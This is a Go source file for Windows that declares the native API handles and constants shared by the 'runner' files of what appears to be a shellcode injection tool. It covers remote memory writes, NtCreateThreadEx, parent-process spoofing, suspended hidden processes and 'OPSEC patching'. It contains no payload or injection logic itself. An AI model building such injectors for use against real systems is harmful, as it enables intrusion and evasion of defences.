//go:build windows

package main

import "syscall"

// All lazy DLL and proc declarations shared across runner files.

var (
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	// NT memory + thread
	procNtAlloc       = ntdll.NewProc("NtAllocateVirtualMemory")
	procNtWrite       = ntdll.NewProc("NtWriteVirtualMemory")
	procNtProtect     = ntdll.NewProc("NtProtectVirtualMemory")
	procNtCreateThread = ntdll.NewProc("NtCreateThreadEx")
	procNtOpen        = ntdll.NewProc("NtOpenProcess")
	procNtWait        = ntdll.NewProc("NtWaitForSingleObject")

	// Kernel32 — process/thread management and OPSEC patching
	procVirtProt      = kernel32.NewProc("VirtualProtect")
	procOpenProcess   = kernel32.NewProc("OpenProcess")
	procCreateProcess = kernel32.NewProc("CreateProcessW")
	procInitAttr      = kernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateAttr    = kernel32.NewProc("UpdateProcThreadAttribute")
	procSnapshot      = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProc32First   = kernel32.NewProc("Process32FirstW")
	procProc32Next    = kernel32.NewProc("Process32NextW")
	procResumeThread  = kernel32.NewProc("ResumeThread")
)

const (
	memCommit       = 0x1000
	memReserve      = 0x2000
	pageReadWrite   = 0x04
	pageExecuteRead = 0x20
	pageRWX         = 0x40
	threadAllAccess = 0x1FFFFF
	processAllAccess = 0x1FFFFF
	currentProcess  = ^uintptr(0) // pseudo-handle -1

	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	EXTENDED_STARTUPINFO_PRESENT         = 0x00080000
	CREATE_SUSPENDED                     = 0x00000004
	CREATE_NO_WINDOW                     = 0x08000000
	STARTF_USESHOWWINDOW                 = 0x00000001
	TH32CS_SNAPPROCESS                   = 0x00000002
)
